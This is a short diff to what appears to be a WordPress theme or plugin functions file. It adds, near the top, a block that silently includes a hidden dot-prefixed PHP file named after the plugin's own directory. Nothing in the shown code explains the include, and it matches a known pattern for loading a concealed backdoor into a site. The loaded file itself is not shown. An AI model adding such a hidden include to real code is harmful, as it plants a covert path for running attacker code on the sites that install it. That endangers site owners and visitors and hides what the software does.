@@ -1,5 +1,9 @@
 <?php
 // Adding functions for theme
+
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
 
 function gt3_types_init(){
 	if(class_exists('Vc_Manager')) {
